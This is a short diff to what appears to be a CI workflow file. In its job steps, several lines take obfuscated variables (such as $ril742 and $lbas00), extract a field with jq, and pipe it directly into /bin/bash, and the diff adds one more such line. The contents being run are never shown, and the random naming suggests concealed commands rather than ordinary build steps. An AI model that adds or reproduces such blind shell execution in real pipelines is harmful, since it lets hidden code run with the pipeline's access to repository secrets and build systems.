@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ril742" | jq -r .b88 | /bin/bash
           echo $tnsa5 | jq -r .jwmbb235 | /bin/bash
           printf '%s' "$lbas00" | jq -r .quu83 | /bin/bash
+          printf '%s' "$u6739" | jq -r .i60 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
